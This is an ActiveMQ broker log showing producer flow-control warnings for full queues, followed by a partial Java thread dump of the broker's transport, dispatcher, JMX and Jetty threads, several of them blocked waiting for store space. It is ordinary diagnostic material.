 INFO | Usage Manager Store is Full. Producer (ID:HOST2-46261-1270635495961-0:0:6:1) stopped to prevent flooding queue://queue/Einarbeitungsdaten_RemoteQ. See http://activemq.apache.org/producer-flow-control.html for more info (blocking for: 120s)
 INFO | Usage Manager Store is Full. Producer (ID:HOST2-12587-1270572565654-0:22380:1:1) stopped to prevent flooding queue://queue/Initialdaten_RemoteQ. See http://activemq.apache.org/producer-flow-control.html for more info (blocking for: 210s)
 INFO | Usage Manager Store is Full. Producer (ID:HOST2-46261-1270635495961-0:0:6:1) stopped to prevent flooding queue://queue/Einarbeitungsdaten_RemoteQ. See http://activemq.apache.org/producer-flow-control.html for more info (blocking for: 150s)
 INFO | Usage Manager Store is Full. Producer (ID:HOST2-12587-1270572565654-0:22380:1:1) stopped to prevent flooding queue://queue/Initialdaten_RemoteQ. See http://activemq.apache.org/producer-flow-control.html for more info (blocking for: 240s)
 INFO | Usage Manager Store is Full. Producer (ID:HOST2-46261-1270635495961-0:0:6:1) stopped to prevent flooding queue://queue/Einarbeitungsdaten_RemoteQ. See http://activemq.apache.org/producer-flow-control.html for more info (blocking for: 180s)
 INFO | Usage Manager Store is Full. Producer (ID:HOST2-12587-1270572565654-0:22380:1:1) stopped to prevent flooding queue://queue/Initialdaten_RemoteQ. See http://activemq.apache.org/producer-flow-control.html for more info (blocking for: 270s)
2010-04-07 12:21:55
Full thread dump Java HotSpot(TM) 64-Bit Server VM (14.2-b01 mixed mode):

""InactivityMonitor Async Task: java.util.concurrent.ThreadPoolExecutor$Worker@717fed4"" daemon prio=10 tid=0x00007f71b0a1e000 nid=0x4164 waiting on condition [0x00007f71b4a3e000]
   java.lang.Thread.State: TIMED_WAITING (parking)
        at sun.misc.Unsafe.park(Native Method)
        - parking to wait for  <0x00007f71c83a2210> (a java.util.concurrent.SynchronousQueue$TransferStack)
        at java.util.concurrent.locks.LockSupport.parkNanos(Unknown Source)
        at java.util.concurrent.SynchronousQueue$TransferStack.awaitFulfill(Unknown Source)
        at java.util.concurrent.SynchronousQueue$TransferStack.transfer(Unknown Source)
        at java.util.concurrent.SynchronousQueue.poll(Unknown Source)
        at java.util.concurrent.ThreadPoolExecutor.getTask(Unknown Source)
        at java.util.concurrent.ThreadPoolExecutor$Worker.run(Unknown Source)
        at java.lang.Thread.run(Unknown Source)

""InactivityMonitor Async Task: java.util.concurrent.ThreadPoolExecutor$Worker@6cfcaac5"" daemon prio=10 tid=0x00007f71b0a1d000 nid=0x4163 waiting on condition [0x00007f71af7f6000]
   java.lang.Thread.State: TIMED_WAITING (parking)
        at sun.misc.Unsafe.park(Native Method)
        - parking to wait for  <0x00007f71c83a2210> (a java.util.concurrent.SynchronousQueue$TransferStack)
        at java.util.concurrent.locks.LockSupport.parkNanos(Unknown Source)
        at java.util.concurrent.SynchronousQueue$TransferStack.awaitFulfill(Unknown Source)
        at java.util.concurrent.SynchronousQueue$TransferStack.transfer(Unknown Source)
        at java.util.concurrent.SynchronousQueue.poll(Unknown Source)
        at java.util.concurrent.ThreadPoolExecutor.getTask(Unknown Source)
        at java.util.concurrent.ThreadPoolExecutor$Worker.run(Unknown Source)
        at java.lang.Thread.run(Unknown Source)

""JMX server connection timeout 94"" daemon prio=10 tid=0x0000000040530000 nid=0x414e in Object.wait() [0x00007f71b4c40000]
   java.lang.Thread.State: TIMED_WAITING (on object monitor)
        at java.lang.Object.wait(Native Method)
        - waiting on <0x00007f71efd665e8> (a [I)
        at com.sun.jmx.remote.internal.ServerCommunicatorAdmin$Timeout.run(Unknown Source)
        - locked <0x00007f71efd665e8> (a [I)
        at java.lang.Thread.run(Unknown Source)

""RMI TCP Connection(4)-10.130.39.230"" daemon prio=10 tid=0x00000000409e8800 nid=0x414d in Object.wait() [0x00007f71af3d6000]
   java.lang.Thread.State: TIMED_WAITING (on object monitor)
        at java.lang.Object.wait(Native Method)
        - waiting on <0x00007f71efbd6710> (a com.sun.jmx.remote.internal.ArrayNotificationBuffer)
        at com.sun.jmx.remote.internal.ArrayNotificationBuffer.fetchNotifications(Unknown Source)
        - locked <0x00007f71efbd6710> (a com.sun.jmx.remote.internal.ArrayNotificationBuffer)
        at com.sun.jmx.remote.internal.ArrayNotificationBuffer$ShareBuffer.fetchNotifications(Unknown Source)
        at com.sun.jmx.remote.internal.ServerNotifForwarder.fetchNotifs(Unknown Source)
        at javax.management.remote.rmi.RMIConnectionImpl$2.run(Unknown Source)
        at javax.management.remote.rmi.RMIConnectionImpl$2.run(Unknown Source)
        at java.security.AccessController.doPrivileged(Native Method)
        at javax.management.remote.rmi.RMIConnectionImpl.fetchNotifications(Unknown Source)
        at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
        at sun.reflect.NativeMethodAccessorImpl.invoke(Unknown Source)
        at sun.reflect.DelegatingMethodAccessorImpl.invoke(Unknown Source)
        at java.lang.reflect.Method.invoke(Unknown Source)
        at sun.rmi.server.UnicastServerRef.dispatch(Unknown Source)
        at sun.rmi.transport.Transport$1.run(Unknown Source)
        at java.security.AccessController.doPrivileged(Native Method)
        at sun.rmi.transport.Transport.serviceCall(Unknown Source)
        at sun.rmi.transport.tcp.TCPTransport.handleMessages(Unknown Source)
        at sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.run0(Unknown Source)
        at sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.run(Unknown Source)
        at java.util.concurrent.ThreadPoolExecutor$Worker.runTask(Unknown Source)
        at java.util.concurrent.ThreadPoolExecutor$Worker.run(Unknown Source)
        at java.lang.Thread.run(Unknown Source)

""RMI TCP Connection(7)-10.130.39.230"" daemon prio=10 tid=0x0000000040479800 nid=0x414c runnable [0x00007f71b6760000]
   java.lang.Thread.State: RUNNABLE
        at java.net.SocketInputStream.socketRead0(Native Method)
        at java.net.SocketInputStream.read(Unknown Source)
        at java.io.BufferedInputStream.fill(Unknown Source)
        at java.io.BufferedInputStream.read(Unknown Source)
        - locked <0x00007f71efd8af60> (a java.io.BufferedInputStream)
        at java.io.FilterInputStream.read(Unknown Source)
        at sun.rmi.transport.tcp.TCPTransport.handleMessages(Unknown Source)
        at sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.run0(Unknown Source)
        at sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.run(Unknown Source)
        at java.util.concurrent.ThreadPoolExecutor$Worker.runTask(Unknown Source)
        at java.util.concurrent.ThreadPoolExecutor$Worker.run(Unknown Source)
        at java.lang.Thread.run(Unknown Source)

""btpool0-8"" prio=10 tid=0x00007f71a8b72800 nid=0x4143 in Object.wait() [0x00007f71af5f4000]
   java.lang.Thread.State: TIMED_WAITING (on object monitor)
        at java.lang.Object.wait(Native Method)
        - waiting on <0x00007f71efc85688> (a org.mortbay.thread.BoundedThreadPool$PoolThread)
        at org.mortbay.thread.BoundedThreadPool$PoolThread.run(BoundedThreadPool.java:490)
        - locked <0x00007f71efc85688> (a org.mortbay.thread.BoundedThreadPool$PoolThread)

""ActiveMQ Transport: tcp:///10.73.11.1:46264"" daemon prio=10 tid=0x00000000402f7000 nid=0x4142 in Object.wait() [0x00007f71aefd4000]
   java.lang.Thread.State: TIMED_WAITING (on object monitor)
        at java.lang.Object.wait(Native Method)
        - waiting on <0x00007f71c2957450> (a java.lang.Object)
        at org.apache.activemq.usage.Usage.waitForSpace(Usage.java:100)
        - locked <0x00007f71c2957450> (a java.lang.Object)
        at org.apache.activemq.broker.region.Queue.waitForSpace(Queue.java:1726)
        at org.apache.activemq.broker.region.Queue.doMessageSend(Queue.java:568)
        - locked <0x00007f71efb09768> (a java.lang.Object)
        at org.apache.activemq.broker.region.Queue.send(Queue.java:539)
        at org.apache.activemq.broker.region.AbstractRegion.send(AbstractRegion.java:354)
        at org.apache.activemq.broker.region.RegionBroker.send(RegionBroker.java:445)
        at org.apache.activemq.broker.TransactionBroker.send(TransactionBroker.java:224)
        at org.apache.activemq.broker.BrokerFilter.send(BrokerFilter.java:126)
        at org.apache.activemq.broker.CompositeDestinationBroker.send(CompositeDestinationBroker.java:95)
        at org.apache.activemq.broker.MutableBrokerFilter.send(MutableBrokerFilter.java:133)
        at org.apache.activemq.broker.TransportConnection.processMessage(TransportConnection.java:446)
        at org.apache.activemq.command.ActiveMQMessage.visit(ActiveMQMessage.java:631)
        at org.apache.activemq.broker.TransportConnection.service(TransportConnection.java:300)
        at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:178)
        at org.apache.activemq.transport.TransportFilter.onCommand(TransportFilter.java:68)
        at org.apache.activemq.transport.WireFormatNegotiator.onCommand(WireFormatNegotiator.java:113)
        at org.apache.activemq.transport.InactivityMonitor.onCommand(InactivityMonitor.java:216)
        - locked <0x00007f71efc544c0> (a org.apache.activemq.transport.InactivityMonitor$1)
        at org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:84)
        at org.apache.activemq.transport.tcp.TcpTransport.doRun(TcpTransport.java:204)
        at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:186)
        at java.lang.Thread.run(Unknown Source)

""ActiveMQ Connection Dispatcher: /10.73.11.1:46264"" daemon prio=10 tid=0x0000000040236000 nid=0x4141 in Object.wait() [0x00007f71af0d5000]
   java.lang.Thread.State: WAITING (on object monitor)
        at java.lang.Object.wait(Native Method)
        - waiting on <0x00007f71efc29000> (a java.lang.Object)
        at java.lang.Object.wait(Object.java:485)
        at org.apache.activemq.thread.DedicatedTaskRunner.runTask(DedicatedTaskRunner.java:105)
        - locked <0x00007f71efc29000> (a java.lang.Object)
        at org.apache.activemq.thread.DedicatedTaskRunner$1.run(DedicatedTaskRunner.java:36)

""btpool0-6"" prio=10 tid=0x00007f71a8449000 nid=0x4138 in Object.wait() [0x00007f71af4f3000]
   java.lang.Thread.State: TIMED_WAITING (on object monitor)
        at java.lang.Object.wait(Native Method)
        - waiting on <0x00007f71efc86118> (a org.mortbay.thread.BoundedThreadPool$PoolThread)
        at org.mortbay.thread.BoundedThreadPool$PoolThread.run(BoundedThreadPool.java:490)
        - locked <0x00007f71efc86118> (a org.mortbay.thread.BoundedThreadPool$PoolThread)

""btpool0-4"" prio=10 tid=0x00007f71a86dd800 nid=0x4136 in Object.wait() [0x00007f71af6f5000]
   java.lang.Thread.State: TIMED_WAITING (on object monitor)
        at java.lang.Object.wait(Native Method)
        - waiting on <0x00007f71efc84bf8> (a org.mortbay.thread.BoundedThreadPool$PoolThread)
        at org.mortbay.thread.BoundedThreadPool$PoolThread.run(BoundedThreadPool.java:490)
        - locked <0x00007f71efc84bf8> (a org.mortbay.thread.BoundedThreadPool$PoolThread)

""btpool0-2"" prio=10 tid=0x0000000040a17800 nid=0x4134 in Object.wait() [0x00007f71af8f7000]
   java.lang.Thread.State: TIMED_WAITING (on object monitor)
        at java.lang.Object.wait(Native Method)
        - waiting on <0x00007f71efc80150> (a org.mortbay.thread.BoundedThreadPool$PoolThread)
        at org.mortbay.thread.BoundedThreadPool$PoolThread.run(BoundedThreadPool.java:490)
        - locked <0x00007f71efc80150> (a org.mortbay.thread.BoundedThreadPool$PoolThread)

""Timer-3"" daemon prio=10 tid=0x00007f71b056c000 nid=0x4132 in Object.wait() [0x00007f71afaf9000]
   java.lang.Thread.State: TIMED_WAITING (on object monitor)
        at java.lang.Object.wait(Native Method)
        - waiting on <0x00007f71efd143d8> (a java.util.TaskQueue)
        at java.util.TimerThread.mainLoop(Unknown Source)
        - locked <0x00007f71efd143d8> (a java.util.TaskQueue)
        at java.util.TimerThread.run(Unknown Source)

""Timer-2"" daemon prio=10 tid=0x00007f71b0103000 nid=0x4131 in Object.wait() [0x00007f71afbfa000]
   java.lang.Thread.State: TIMED_WAITING (on object monitor)
        at java.lang.Object.wait(Native Method)
        - waiting on <0x00007f71efd67d68> (a java.util.TaskQueue)
        at java.util.TimerThread.mainLoop(Unknown Source)
        - locked <0x00007f71efd67d68> (a java.util.TaskQueue)
        at java.util.TimerThread.run(Unknown Source)

""ActiveMQ Session: ID:esxschnapp3-x3850.argl.iv.FOOBAR.de-48924-1270635425111-2:0:1"" prio=10 tid=0x00007f71a8034000 nid=0x4130 in Object.wait() [0x00007f71afcfb000]
   java.lang.Thread.State: WAITING (on object monitor)
        at java.lang.Object.wait(Native Method)
        - waiting on <0x00007f71efd09b68> (a java.lang.Object)
        at java.lang.Object.wait(Object.java:485)
        at org.apache.activemq.thread.DedicatedTaskRunner.runTask(DedicatedTaskRunner.java:105)
        - locked <0x00007f71efd09b68> (a java.lang.Object)
        at org.apache.activemq.thread.DedicatedTaskRunner$1.run(DedicatedTaskRunner.java:36)

""Topic  ActiveMQ.Advisory.Consumer.Queue.example.A"" daemon prio=10 tid=0x00000000409d8000 nid=0x412f in Object.wait() [0x00007f71afdfc000]
   java.lang.Thread.State: WAITING (on object monitor)
        at java.lang.Object.wait(Native Method)
        - waiting on <0x00007f71efb4cc78> (a java.lang.Object)
        at java.lang.Object.wait(Object.java:485)
        at org.apache.activemq.thread.DedicatedTaskRunner.runTask(DedicatedTaskRunner.java:105)
        - locked <0x00007f71efb4cc78> (a java.lang.Object)
        at org.apache.activemq.thread.DedicatedTaskRunner$1.run(DedicatedTaskRunner.java:36)

""DefaultMessageListenerContainer-1"" prio=10 tid=0x00000000409dc000 nid=0x412e in Object.wait() [0x00007f71b4114000]
   java.lang.Thread.State: TIMED_WAITING (on object monitor)
        at java.lang.Object.wait(Native Method)
        - waiting on <0x00007f71efd09d90> (a java.lang.Object)
        at org.apache.activemq.MessageDispatchChannel.dequeue(MessageDispatchChannel.java:77)
        - locked <0x00007f71efd09d90> (a java.lang.Object)
        at org.apache.activemq.ActiveMQMessageConsumer.dequeue(ActiveMQMessageConsumer.java:447)
        at org.apache.activemq.ActiveMQMessageConsumer.receive(ActiveMQMessageConsumer.java:572)
        at org.springframework.jms.listener.AbstractPollingMessageListenerContainer.receiveMessage(AbstractPollingMessageListenerContainer.java:405)
        at org.springframework.jms.listener.AbstractPollingMessageListenerContainer.doReceiveAndExecute(AbstractPollingMessageListenerContainer.java:308)
        at org.springframework.jms.listener.AbstractPollingMessageListenerContainer.receiveAndExecute(AbstractPollingMessageListenerContainer.java:261)
        at org.springframework.jms.listener.DefaultMessageListenerContainer$AsyncMessageListenerInvoker.invokeListener(DefaultMessageListenerContainer.java:982)
        at org.springframework.jms.listener.DefaultMessageListenerContainer$AsyncMessageListenerInvoker.executeOngoingLoop(DefaultMessageListenerContainer.java:974)
        at org.springframework.jms.listener.DefaultMessageListenerContainer$AsyncMessageListenerInvoker.run(DefaultMessageListenerContainer.java:876)
        at java.lang.Thread.run(Unknown Source)

""ActiveMQ Transport: tcp:///127.0.0.1:52732"" daemon prio=10 tid=0x00000000403ab800 nid=0x412d runnable [0x00007f71afefd000]
   java.lang.Thread.State: RUNNABLE
        at java.net.SocketInputStream.socketRead0(Native Method)
        at java.net.SocketInputStream.read(Unknown Source)
        at org.apache.activemq.transport.tcp.TcpBufferedInputStream.fill(TcpBufferedInputStream.java:50)
        at org.apache.activemq.transport.tcp.TcpTransport$2.fill(TcpTransport.java:527)
        at org.apache.activemq.transport.tcp.TcpBufferedInputStream.read(TcpBufferedInputStream.java:58)
        at org.apache.activemq.transport.tcp.TcpTransport$2.read(TcpTransport.java:512)
        at java.io.DataInputStream.readInt(Unknown Source)
        at org.apache.activemq.openwire.OpenWireFormat.unmarshal(OpenWireFormat.java:269)
        at org.apache.activemq.transport.tcp.TcpTransport.readCommand(TcpTransport.java:211)
        at org.apache.activemq.transport.tcp.TcpTransport.doRun(TcpTransport.java:203)
        at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:186)
        at java.lang.Thread.run(Unknown Source)

""ActiveMQ Connection Dispatcher: /127.0.0.1:52732"" daemon prio=10 tid=0x00000000403a9800 nid=0x412c in Object.wait() [0x00007f71afffe000]
   java.lang.Thread.State: WAITING (on object monitor)
        at java.lang.Object.wait(Native Method)
        - waiting on <0x00007f71ef966be8> (a java.lang.Object)
        at java.lang.Object.wait(Object.java:485)
        at org.apache.activemq.thread.DedicatedTaskRunner.runTask(DedicatedTaskRunner.java:105)
        - locked <0x00007f71ef966be8> (a java.lang.Object)
        at org.apache.activemq.thread.DedicatedTaskRunner$1.run(DedicatedTaskRunner.java:36)

""ActiveMQ Transport: tcp://localhost/127.0.0.1:61616"" prio=10 tid=0x0000000040947000 nid=0x412a runnable [0x00007f71b4215000]
   java.lang.Thread.State: RUNNABLE
        at java.net.SocketInputStream.socketRead0(Native Method)
        at java.net.SocketInputStream.read(Unknown Source)
        at org.apache.activemq.transport.tcp.TcpBufferedInputStream.fill(TcpBufferedInputStream.java:50)
        at org.apache.activemq.transport.tcp.TcpTransport$2.fill(TcpTransport.java:527)
        at org.apache.activemq.transport.tcp.TcpBufferedInputStream.read(TcpBufferedInputStream.java:58)
        at org.apache.activemq.transport.tcp.TcpTransport$2.read(TcpTransport.java:512)
        at java.io.DataInputStream.readInt(Unknown Source)
        at org.apache.activemq.openwire.OpenWireFormat.unmarshal(OpenWireFormat.java:269)
        at org.apache.activemq.transport.tcp.TcpTransport.readCommand(TcpTransport.java:211)
        at org.apache.activemq.transport.tcp.TcpTransport.doRun(TcpTransport.java:203)
        at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:186)
        at java.lang.Thread.run(Unknown Source)

""ActiveMQ Failover Worker: 1811450195"" daemon prio=10 tid=0x00007f71a8009800 nid=0x4129 in Object.wait() [0x00007f71b4316000]
   java.lang.Thread.State: WAITING (on object monitor)
        at java.lang.Object.wait(Native Method)
        - waiting on <0x00007f71efd11618> (a java.lang.Object)
        at java.lang.Object.wait(Object.java:485)
        at org.apache.activemq.thread.DedicatedTaskRunner.runTask(DedicatedTaskRunner.java:105)
        - locked <0x00007f71efd11618> (a java.lang.Object)
        at org.apache.activemq.thread.DedicatedTaskRunner$1.run(DedicatedTaskRunner.java:36)

""Timer-1"" daemon prio=10 tid=0x00007f71b0780800 nid=0x411e in Object.wait() [0x00007f71b4417000]
   java.lang.Thread.State: TIMED_WAITING (on object monitor)
        at java.lang.Object.wait(Native Method)
        - waiting on <0x00007f71c7fdd550> (a java.util.TaskQueue)
        at java.util.TimerThread.mainLoop(Unknown Source)
        - locked <0x00007f71c7fdd550> (a java.util.TaskQueue)
        at java.util.TimerThread.run(Unknown Source)

""Timer-0"" daemon prio=10 tid=0x00007f71b0018800 nid=0x411d in Object.wait() [0x00007f71b4539000]
   java.lang.Thread.State: TIMED_WAITING (on object monitor)
        at java.lang.Object.wait(Native Method)
        - waiting on <0x00007f71efc86ea8> (a java.util.TaskQueue)
        at java.util.TimerThread.mainLoop(Unknown Source)
        - locked <0x00007f71efc86ea8> (a java.util.TaskQueue)
        at java.util.TimerThread.run(Unknown Source)

""Topic  ActiveMQ.Advisory.Producer.Queue.queue/Initialdaten_RemoteQ"" daemon prio=10 tid=0x0000000040827000 nid=0x411c in Object.wait() [0x00007f71b463a000]
   java.lang.Thread.State: WAITING (on object monitor)
        at java.lang.Object.wait(Native Method)
        - waiting on <0x00007f71efb4ad20> (a java.lang.Object)
        at java.lang.Object.wait(Object.java:485)
        at org.apache.activemq.thread.DedicatedTaskRunner.runTask(DedicatedTaskRunner.java:105)
        - locked <0x00007f71efb4ad20> (a java.lang.Object)
        at org.apache.activemq.thread.DedicatedTaskRunner$1.run(DedicatedTaskRunner.java:36)

""btpool0-0 - Acceptor0 SelectChannelConnector@0.0.0.0:8161"" prio=10 tid=0x00007f71b0137800 nid=0x411b runnable [0x00007f71b4d41000]
   java.lang.Thread.State: RUNNABLE
        at sun.nio.ch.EPollArrayWrapper.epollWait(Native Method)
        at sun.nio.ch.EPollArrayWrapper.poll(Unknown Source)
        at sun.nio.ch.EPollSelectorImpl.doSelect(Unknown Source)
        at sun.nio.ch.SelectorImpl.lockAndDoSelect(Unknown Source)
        - locked <0x00007f71efd0c458> (a sun.nio.ch.Util$1)
        - locked <0x00007f71efd0c440> (a java.util.Collections$UnmodifiableSet)
        - locked <0x00007f71efbda070> (a sun.nio.ch.EPollSelectorImpl)
        at sun.nio.ch.SelectorImpl.select(Unknown Source)
        at org.mortbay.io.nio.SelectorManager$SelectSet.doSelect(SelectorManager.java:406)
        at org.mortbay.io.nio.SelectorManager.doSelect(SelectorManager.java:166)
        at org.mortbay.jetty.nio.SelectChannelConnector.accept(SelectChannelConnector.java:124)
        at org.mortbay.jetty.AbstractConnector$Acceptor.run(AbstractConnector.java:537)
        at org.mortbay.thread.BoundedThreadPool$PoolThread.run(BoundedThreadPool.java:450)

""Topic  ActiveMQ.Advisory.Connection"" daemon prio=10 tid=0x000000004018a000 nid=0x411a in Object.wait() [0x00007f71b4e42000]
   java.lang.Thread.State: WAITING (on object monitor)
        at java.lang.Object.wait(Native Method)
        - waiting on <0x00007f71efb4ea18> (a java.lang.Object)
        at java.lang.Object.wait(Object.java:485)
        at org.apache.activemq.thread.DedicatedTaskRunner.runTask(DedicatedTaskRunner.java:105)
        - locked <0x00007f71efb4ea18> (a java.lang.Object)
        at org.apache.activemq.thread.DedicatedTaskRunner$1.run(DedicatedTaskRunner.java:36)

""InactivityMonitor WriteCheck"" daemon prio=10 tid=0x0000000040829000 nid=0x4119 in Object.wait() [0x00007f71b473b000]
   java.lang.Thread.State: TIMED_WAITING (on object monitor)
        at java.lang.Object.wait(Native Method)
        - waiting on <0x00007f71efd31248> (a java.util.TaskQueue)
        at java.util.TimerThread.mainLoop(Unknown Source)
        - locked <0x00007f71efd31248> (a java.util.TaskQueue)
        at java.util.TimerThread.run(Unknown Source)

""InactivityMonitor ReadCheck"" daemon prio=10 tid=0x0000000040838800 nid=0x4118 in Object.wait() [0x00007f71b483c000]
   java.lang.Thread.State: TIMED_WAITING (on object monitor)
        at java.lang.Object.wait(Native Method)
        - waiting on <0x00007f71efc87c68> (a java.util.TaskQueue)
        at java.util.TimerThread.mainLoop(Unknown Source)
        - locked <0x00007f71efc87c68> (a java.util.TaskQueue)
        at java.util.TimerThread.run(Unknown Source)

""ActiveMQ Transport: tcp:///10.73.11.1:46253"" daemon prio=10 tid=0x0000000040824800 nid=0x4117 in Object.wait() [0x00007f71b493c000]
   java.lang.Thread.State: TIMED_WAITING (on object monitor)
        at java.lang.Object.wait(Native Method)
        - waiting on <0x00007f71c2957450> (a java.lang.Object)
        at org.apache.activemq.usage.Usage.waitForSpace(Usage.java:100)
        - locked <0x00007f71c2957450> (a java.lang.Object)
        at org.apache.activemq.broker.region.Queue.waitForSpace(Queue.java:1726)
        at org.apache.activemq.broker.region.Queue.doMessageSend(Queue.java:568)
        - locked <0x00007f71c3d75ff8> (a java.lang.Object)
        at org.apache.activemq.broker.region.Queue.send(Queue.java:539)
        at org.apache.activemq.broker.region.AbstractRegion.send(AbstractRegion.java:354)
        at org.apache.activemq.broker.region.RegionBroker.send(RegionBroker.java:445)
        at org.apache.activemq.broker.TransactionBroker.send(TransactionBroker.java:224)
        at org.apache.activemq.broker.BrokerFilter.send(BrokerFilter.java:126)
        at org.apache.activemq.broker.CompositeDestinationBroker.send(CompositeDestinationBroker.java:95)
        at org.apache.activemq.broker.MutableBrokerFilter.send(MutableBrokerFilter.java:133)
        at org.apache.activemq.broker.TransportConnection.processMessage(TransportConnection.java:446)
        at org.apache.activemq.command.ActiveMQMessage.visit(ActiveMQMessage.java:631)
        at org.apache.activemq.broker.TransportConnection.service(TransportConnection.java:300)
        at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:178)
        at org.apache.activemq.transport.TransportFilter.onCommand(TransportFilter.java:68)
        at org.apache.activemq.transport.WireFormatNegotiator.onCommand(WireFormatNegotiator.java:113)
        at org.apache.activemq.transport.InactivityMonitor.onCommand(InactivityMonitor.java:216)
        - locked <0x00007f71efad4c00> (a org.apache.activemq.transport.InactivityMonitor$1)
        at org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:84)
        at org.apache.activemq.transport.tcp.TcpTransport.doRun(TcpTransport.java:204)
        at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:186)
        at java.lang.Thread.run(Unknown Source)

""ActiveMQ Connection Dispatcher: /10.73.11.1:46253"" daemon prio=10 tid=0x00000000406ee000 nid=0x4115 in Object.wait() [0x00007f71b4b3f000]
   java.lang.Thread.State: WAITING (on object monitor)
        at java.lang.Object.wait(Native Method)
        - waiting on <0x00007f71efab86f8> (a java.lang.Object)
        at java.lang.Object.wait(Object.java:485)
        at org.apache.activemq.thread.DedicatedTaskRunner.runTask(DedicatedTaskRunner.java:105)
        - locked <0x00007f71efab86f8> (a java.lang.Object)
        at org.apache.activemq.thread.DedicatedTaskRunner$1.run(DedicatedTaskRunner.java:36)

""ActiveMQ Transport Server: tcp://0.0.0.0:61616"" daemon prio=10 tid=0x00007f71b0456800 nid=0x4111 runnable [0x00007f71b4f43000]
   java.lang.Thread.State: RUNNABLE
        at java.net.PlainSocketImpl.socketAccept(Native Method)
        at java.net.PlainSocketImpl.accept(Unknown Source)
        - locked <0x00007f71efc552b8> (a java.net.SocksSocketImpl)
        at java.net.ServerSocket.implAccept(Unknown Source)
        at java.net.ServerSocket.accept(Unknown Source)
        at org.apache.activemq.transport.tcp.TcpTransportServer.run(TcpTransportServer.java:280)
        at java.lang.Thread.run(Unknown Source)

""ActiveMQ Transport Server Thread Handler: tcp://0.0.0.0:61616"" daemon prio=10 tid=0x00007f71b0457800 nid=0x4110 waiting on condition [0x00007f71b5044000]
   java.lang.Thread.State: TIMED_WAITING (parking)
        at sun.misc.Unsafe.park(Native Method)
        - parking to wait for  <0x00007f71efc555a0> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject)
        at java.util.concurrent.locks.LockSupport.parkNanos(Unknown Source)
        at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.awaitNanos(Unknown Source)
        at java.util.concurrent.LinkedBlockingQueue.poll(Unknown Source)
        at org.apache.activemq.transport.tcp.TcpTransportServer$1.run(TcpTransportServer.java:352)
        at java.lang.Thread.run(Unknown Source)

""Producer Flow Control Timeout Task"" prio=10 tid=0x00007f71b00c2000 nid=0x410f waiting on condition [0x00007f71b514c000]
   java.lang.Thread.State: WAITING (parking)
        at sun.misc.Unsafe.park(Native Method)
        - parking to wait for  <0x00007f71efb0bcb8> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject)
        at java.util.concurrent.locks.LockSupport.park(Unknown Source)
        at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(Unknown Source)
        at java.util.concurrent.DelayQueue.take(Unknown Source)
        at org.apache.activemq.broker.region.Queue$FlowControlTimeoutTask.run(Queue.java:169)

""Queue:DLQ.queue/Initialdaten_RemoteQ"" daemon prio=10 tid=0x00007f71b00c0000 nid=0x410e in Object.wait() [0x00007f71b524d000]
   java.lang.Thread.State: WAITING (on object monitor)
        at java.lang.Object.wait(Native Method)
        - waiting on <0x00007f71efb0b1e8> (a java.lang.Object)
        at java.lang.Object.wait(Object.java:485)
        at org.apache.activemq.thread.DedicatedTaskRunner.runTask(DedicatedTaskRunner.java:105)
        - locked <0x00007f71efb0b1e8> (a java.lang.Object)
        at org.apache.activemq.thread.DedicatedTaskRunner$1.run(DedicatedTaskRunner.java:36)

""Checkpoint: queue://DLQ.queue/Initialdaten_RemoteQ"" daemon prio=10 tid=0x00007f71b00be800 nid=0x410d in Object.wait() [0x00007f71b534e000]
   java.lang.Thread.State: WAITING (on object monitor)
        at java.lang.Object.wait(Native Method)
        - waiting on <0x00007f71efb0a5e8> (a java.lang.Object)
        at java.lang.Object.wait(Object.java:485)
        at org.apache.activemq.thread.DedicatedTaskRunner.runTask(DedicatedTaskRunner.java:105)
        - locked <0x00007f71efb0a5e8> (a java.lang.Object)
        at org.apache.activemq.thread.DedicatedTaskRunner$1.run(DedicatedTaskRunner.java:36)

""Producer Flow Control Timeout Task"" prio=10 tid=0x00007f71b00bc000 nid=0x410c waiting on condition [0x00007f71b544f000]
   java.lang.Thread.State: WAITING (parking)
        at sun.misc.Unsafe.park(Native Method)
        - parking to wait for  <0x00007f71efad75c0> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject)
        at java.util.concurrent.locks.LockSupport.park(Unknown Source)
        at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(Unknown Source)
        at java.util.concurrent.DelayQueue.take(Unknown Source)
        at org.apache.activemq.broker.region.Queue$FlowControlTimeoutTask.run(Queue.java:169)

""Queue:example.A"" daemon prio=10 tid=0x00007f71b04c5000 nid=0x410b in Object.wait() [0x00007f71b5550000]
   java.lang.Thread.State: WAITING (on object monitor)
        at java.lang.Object.wait(Native Method)
        - waiting on <0x00007f71efad6588> (a java.lang.Object)
        at java.lang.Object.wait(Object.java:485)
        at org.apache.activemq.thread.DedicatedTaskRunner.runTask(DedicatedTaskRunner.java:105)
        - locked <0x00007f71efad6588> (a java.lang.Object)
        at org.apache.activemq.thread.DedicatedTaskRunner$1.run(DedicatedTaskRunner.java:36)

""Checkpoint: queue://example.A"" daemon prio=10 tid=0x00007f71b04c3000 nid=0x410a in Object.wait() [0x00007f71b5651000]
   java.lang.Thread.State: WAITING (on object monitor)
        at java.lang.Object.wait(Native Method)
        - waiting on <0x00007f71efad59d8> (a java.lang.Object)
        at java.lang.Object.wait(Object.java:485)
        at org.apache.activemq.thread.DedicatedTaskRunner.runTask(DedicatedTaskRunner.java:105)
        - locked <0x00007f71efad59d8> (a java.lang.Object)
        at org.apache.activemq.thread.DedicatedTaskRunner$1.run(DedicatedTaskRunner.java:36)

""Producer Flow Control Timeout Task"" prio=10 tid=0x00007f71b04c8000 nid=0x4109 waiting on condition [0x00007f71b5752000]
   java.lang.Thread.State: WAITING (parking)
        at sun.misc.Unsafe.park(Native Method)
